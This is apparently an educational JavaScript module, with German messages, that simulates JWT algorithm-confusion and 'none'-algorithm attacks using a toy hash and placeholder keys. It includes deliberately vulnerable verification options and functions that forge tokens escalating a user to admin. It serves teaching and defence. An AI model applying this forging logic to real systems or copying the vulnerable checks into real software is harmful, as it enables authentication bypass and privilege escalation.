// @ts-check
/**
 * JWT Security & Algorithm Confusion Attack Studio Engine (RFC 7519 / RFC 7518)
 * Simulates:
 * 1. RS256 -> HS256 Algorithm Confusion (Key Confusion / Asymmetric vs Symmetric key flaw)
 * 2. "none" algorithm exploit (CVE-2015-9235)
 * 3. Weak HMAC Secret brute-forcing / dictionary attack detection
 * 4. Tampering & signature verification checks
 */

/**
 * Basic Base64Url encoder/decoder
 * @param {string} str
 */
export function base64UrlEncode(str) {
  try {
    const bytes = new TextEncoder().encode(str);
    let binary = '';
    for (let i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  } catch {
    return '';
  }
}

/**
 * @param {string} str
 */
export function base64UrlDecode(str) {
  try {
    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
    while (base64.length % 4) {
      base64 += '=';
    }
    const binary = atob(base64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
      bytes[i] = binary.charCodeAt(i);
    }
    return new TextDecoder().decode(bytes);
  } catch {
    return '';
  }
}

/**
 * Pseudo HMAC SHA-256 Signature Generator for educational interactive simulation
 * Creates deterministic signatures based on header, payload and secret key
 * @param {string} headerB64
 * @param {string} payloadB64
 * @param {string} key
 * @param {string} [alg]
 */
export function generateSimulatedSignature(headerB64, payloadB64, key, alg = 'HS256') {
  if (alg.toLowerCase() === 'none') {
    return '';
  }
  const input = `${headerB64}.${payloadB64}:${key}:${alg}`;
  let hash = 0;
  for (let i = 0; i < input.length; i++) {
    hash = ((hash << 5) - hash) + input.charCodeAt(i);
    hash |= 0;
  }
  const hex = Math.abs(hash).toString(16).padStart(8, '0');
  return `sig_${alg.toLowerCase()}_${hex}`;
}

export const SAMPLE_RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3f9hL0vQ5w+8X3x
-----END PUBLIC KEY-----`;

export const SAMPLE_RSA_PRIVATE_KEY = `-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3f9hL0vQ5w+8X3x...[SECRET SERVER PRIVATE KEY]
-----END RSA PRIVATE KEY-----`;

/**
 * Creates a valid RS256 Token (issued by auth server)
 */
export function createSampleRs256Token(payloadOverrides = {}) {
  const header = {
    alg: 'RS256',
    typ: 'JWT'
  };
  const payload = {
    sub: 'user_1024',
    name: 'Alice Entwickler',
    role: 'user',
    scope: 'profile:read',
    iat: Math.floor(Date.now() / 1000) - 300,
    exp: Math.floor(Date.now() / 1000) + 3600,
    ...payloadOverrides
  };

  const headerB64 = base64UrlEncode(JSON.stringify(header));
  const payloadB64 = base64UrlEncode(JSON.stringify(payload));
  const signature = generateSimulatedSignature(headerB64, payloadB64, SAMPLE_RSA_PRIVATE_KEY, 'RS256');

  return {
    token: `${headerB64}.${payloadB64}.${signature}`,
    header,
    payload,
    signature
  };
}

/**
 * Simulates Server-side Token Verification against various vulnerabilities
 * @param {string} token
 * @param {Object} options
 * @param {boolean} [options.allowNoneAlg]
 * @param {boolean} [options.vulnerableToAlgConfusion]
 * @param {string} [options.serverConfiguredAlg]
 */
export function verifyJwtToken(token, options = {}) {
  const {
    allowNoneAlg = false,
    vulnerableToAlgConfusion = false,
    serverConfiguredAlg = 'RS256'
  } = options;

  if (!token || typeof token !== 'string') {
    return { valid: false, error: 'Token ist leer oder kein String', claims: null, vulnerabilityTriggered: null };
  }

  const parts = token.split('.');
  if (parts.length < 2 || parts.length > 3) {
    return { valid: false, error: 'Ungültiges JWT-Format (erwartet header.payload.signature)', claims: null, vulnerabilityTriggered: null };
  }

  const [headerB64, payloadB64, sig = ''] = parts;
  let header, payload;

  try {
    header = JSON.parse(base64UrlDecode(headerB64));
    payload = JSON.parse(base64UrlDecode(payloadB64));
  } catch {
    return { valid: false, error: 'JSON-Parsing des Headers oder Payloads fehlgeschlagen', claims: null, vulnerabilityTriggered: null };
  }

  // 1. Check expiration
  const now = Math.floor(Date.now() / 1000);
  if (payload.exp && payload.exp < now) {
    return { valid: false, error: 'Token ist abgelaufen (exp < now)', claims: payload, vulnerabilityTriggered: null };
  }

  // 2. Exploit Check: "none" Algorithm
  if (header.alg && header.alg.toLowerCase() === 'none') {
    if (allowNoneAlg) {
      return {
        valid: true,
        claims: payload,
        vulnerabilityTriggered: 'NONE_ALGORITHM_EXPLOIT',
        warning: 'KRITISCHE SICHERHEITSLÜCKE: Server akzeptiert ungesicherte "none"-Tokens ohne Signaturprüfung!'
      };
    } else {
      return {
        valid: false,
        error: 'Sicherheitsfehler: Algorithmus "none" wird vom Server streng abgelehnt (RFC 7518 Enforcement)',
        claims: null,
        vulnerabilityTriggered: null
      };
    }
  }

  // 3. Exploit Check: Algorithm Confusion (RS256 -> HS256 with Public Key as HMAC secret)
  if (header.alg === 'HS256' && serverConfiguredAlg === 'RS256') {
    if (vulnerableToAlgConfusion) {
      // The vulnerable server takes its configured verification key (the public key string)
      // and passes it to the HMAC-SHA256 validator!
      const expectedConfusionSig = generateSimulatedSignature(headerB64, payloadB64, SAMPLE_RSA_PUBLIC_KEY, 'HS256');
      if (sig === expectedConfusionSig) {
        return {
          valid: true,
          claims: payload,
          vulnerabilityTriggered: 'ALGORITHM_CONFUSION_EXPLOIT',
          warning: 'KRITISCHE SICHERHEITSLÜCKE: Algorithm Confusion Attack erfolgreich! Server nutzte RSA Public Key als HMAC-Secret.'
        };
      } else {
        return {
          valid: false,
          error: 'Signatur ungültig: HMAC-Prüfung gegen Public-Key-Secret fehlgeschlagen',
          claims: null,
          vulnerabilityTriggered: null
        };
      }
    } else {
      return {
        valid: false,
        error: `Algorithmus-Mismatch: Server erzwingt ${serverConfiguredAlg}, empfing aber ${header.alg} im Header`,
        claims: null,
        vulnerabilityTriggered: null
      };
    }
  }

  // 4. Normal RS256 Verification
  if (header.alg === 'RS256') {
    const expectedSig = generateSimulatedSignature(headerB64, payloadB64, SAMPLE_RSA_PRIVATE_KEY, 'RS256');
    if (sig === expectedSig) {
      return {
        valid: true,
        claims: payload,
        vulnerabilityTriggered: null,
        info: 'Token kryptografisch valide verifiziert (RS256 asymmetrisch)'
      };
    } else {
      return {
        valid: false,
        error: 'Signatur ungültig: Token wurde manipuliert oder mit falschem Schlüssel signiert',
        claims: null,
        vulnerabilityTriggered: null
      };
    }
  }

  return { valid: false, error: `Nicht unterstützter Algorithmus: ${header.alg}`, claims: null, vulnerabilityTriggered: null };
}

/**
 * Generates an exploit token for Algorithm Confusion
 * Changes role to admin, alg to HS256 and signs with public key
 * @param {string} originalToken
 * @param {string} [targetRole]
 */
export function forgeAlgorithmConfusionToken(originalToken, targetRole = 'admin') {
  const parts = originalToken.split('.');
  if (parts.length < 2) return '';

  let payload;
  try {
    payload = JSON.parse(base64UrlDecode(parts[1]));
  } catch {
    payload = {};
  }

  payload.role = targetRole;
  payload.scope = 'admin:all cluster:root';

  const forgedHeader = { alg: 'HS256', typ: 'JWT' };
  const headerB64 = base64UrlEncode(JSON.stringify(forgedHeader));
  const payloadB64 = base64UrlEncode(JSON.stringify(payload));
  // Sign using public key string as secret HMAC key
  const signature = generateSimulatedSignature(headerB64, payloadB64, SAMPLE_RSA_PUBLIC_KEY, 'HS256');

  return `${headerB64}.${payloadB64}.${signature}`;
}

/**
 * Generates an exploit token using "none" algorithm
 * @param {string} originalToken
 * @param {string} [targetRole]
 */
export function forgeNoneAlgToken(originalToken, targetRole = 'admin') {
  const parts = originalToken.split('.');
  if (parts.length < 2) return '';

  let payload;
  try {
    payload = JSON.parse(base64UrlDecode(parts[1]));
  } catch {
    payload = {};
  }

  payload.role = targetRole;
  payload.scope = 'admin:all';

  const forgedHeader = { alg: 'none', typ: 'JWT' };
  const headerB64 = base64UrlEncode(JSON.stringify(forgedHeader));
  const payloadB64 = base64UrlEncode(JSON.stringify(payload));

  return `${headerB64}.${payloadB64}.`;
}
